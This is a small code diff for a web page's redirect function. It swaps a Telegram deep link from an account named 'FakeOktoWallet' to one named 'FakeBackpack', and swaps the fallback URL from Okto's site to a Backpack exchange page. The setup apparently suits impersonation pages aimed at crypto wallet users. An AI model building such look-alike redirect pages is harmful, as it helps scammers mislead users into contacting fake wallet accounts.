@@ -36,11 +36,11 @@
     function startRedirect() {
       setTimeout(() => {
         // Try to open Telegram
-        location.href = "tg://resolve?domain=FakeOktoWallet";
+        location.href = "tg://resolve?domain=FakeBackpack";
 
         // Then fallback to Okto after a short delay
         setTimeout(() => {
-          location.href = "https://okto.tech/";
+          location.href = "https://support.backpack.exchange/legal";
         }, 123);
       }, 723); //
     }
